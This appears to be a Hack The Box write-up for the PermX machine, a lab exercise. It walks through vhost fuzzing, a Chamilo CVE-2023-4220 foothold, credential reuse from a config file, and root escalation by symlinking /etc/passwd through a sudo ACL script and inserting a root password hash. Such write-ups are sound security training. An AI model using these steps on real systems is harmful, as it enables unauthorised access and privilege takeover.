---
layout: post
title: HTB PermX
categories: [Writeups]
tags: [HTB]
---

# Initial recon

## Nmap scan
The initial nmap scan reveals that only port 22 and 80 are open on the mashine. 
Here we can see that the mashine is associated with the domain name permx.htb. Whenever we see a domain name, it is a good idea to perfrom a virtual host enumeration.
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e2:5c:5d:8c:47:3e:d8:72:f7:b4:80:03:49:86:6d:ef (ECDSA)
|_  256 1f:41:02:8e:6b:17:18:9c:a0:ac:54:23:e9:71:30:17 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://permx.htb
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Port 80:
This port features a simple webpage that does not offer a lot of funtionality.

### Vhost enumeration
I personally prefer to perform vhost enumeration with the programm [FFUF](https://github.com/ffuf/ffuf), as I have had the most success with this.

To do vhost enumeration with [FFUF](https://github.com/ffuf/ffuf) I generally use the following command:
```shell
ffuf -w <wordlist> -H "Host: FUZZ.domain.tld" -u http(s)://<IP or Hostname>
```

So for this specific mashine the comman would be:
```shell
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H "Host: FUZZ.permx.htb" -u http://10.10.11.23 -fc 302
```

The result of this should look like this: 
```
www                     [Status: 200, Size: 36182, Words: 12829, Lines: 587, Duration: 34ms]
lms                     [Status: 200, Size: 19347, Words: 4910, Lines: 353, Duration: 1689ms]
```

As we can see here, there a two virtual hosts available on the mashine. These have to be added to the `/etc/hosts` file to make them available to us.

Visiting the `lms` subdoman we discover a webpage of an application called "Chamillo". Searching for exploits regarding Chamillo we can find the following CVE: `CVE-2023-4220`
Personally, I used this POC https://github.com/B1TC0R3/CVE-2023-4220-PoC.

Using this POC we get access to the box as the `www-data` user. We then need to decide on futher enumeration steps. as the `www-data` user is typically very low privileged,
we can try to enumerate the web root that the user owns. Here we put the focus on finding credentials. Typically a webroot will contain some sort of credentials in the 
form of database credentials. These can be present in environment or configuration files. Looking for the configuration location for Chamilo we find this github issue: https://github.com/chamilo/chamilo-lms/issues/2682.
This mentiones the existance of a `configuration.php` file.

configuration.php
```php
// Database connection settings.
$_configuration['db_host'] = 'localhost';
$_configuration['db_port'] = '3306';
$_configuration['main_database'] = 'chamilo';
$_configuration['db_user'] = 'chamilo';
$_configuration['db_password'] = '03F6lY3uXAP2bkW8';
// Enable access to database management for platform admins.
$_configuration['db_manager_enabled'] = false;
```

With the following command we can get all users that have a login shell.

```passwd
cat /etc/passwd | grep "sh$"`
root:x:0:0:root:/root:/bin/bash
mtz:x:1000:1000:mtz:/home/mtz:/bin/bash
```

Whenever we get a password it makes sense to try for a password reuse as this happens a lot.
So we will attempt to log in with the mtz user and the passowrd "03F6lY3uXAP2bkW8".

Running linpeas.sh we can discover that the user mtz is allowed to run the following commands with sudo privileges:
```
Matching Defaults entries for mtz on permx:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User mtz may run the following commands on permx:
    (ALL : ALL) NOPASSWD: /opt/acl.sh
./linpeas.sh: 3400: get_current_user_privot_pid: not found
```

The acl.sh script has the following contents:
```bash
#!/bin/bash

if [ "$#" -ne 3 ]; then
    /usr/bin/echo "Usage: $0 user perm file"
    exit 1
fi

user="$1"
perm="$2"
target="$3"

if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then
    /usr/bin/echo "Access denied."
    exit 1
fi

# Check if the path is a file
if [ ! -f "$target" ]; then
    /usr/bin/echo "Target must be a file."
    exit 1
fi

/usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"
```

Looking at the script, we can see that it can be used to set permissions on certain file, with the restiction that the files must be in the home directory of the mtz user.
When we see a restriction regarding a user controlled directory, we can check if the script or program will follow symbolic links. 
We are allowed to symbolocally link files from the root directory to one that we control. We cannot interact with the file, but the script will as it is run with elevated privileges.

There are multiple ways to exploit this to get privesc. I will choose the path of making the `/etc/passwd` file and add a new user with root id.

```shell
ln -s /et/passwd passwd
```

```shell
sudo /opt/acl.sh mtz rwx /home/mtz/passwd
```

We can then edit the passwd file in the users home directory and replace the "x" in the root users entry with a password hash.

We can get a hash with:
```shell
openssl passwd <password>
```

From:
```
root:x:0:0:root:/root:/bin/bash
```

to:
```
root:$1$4kT/OIo.$XtwrceEzSsuz/lS/Re6kK.:0:0:root:/root:/bin/bash
```

We can then enter `su -` and enter the passowrd to become root.
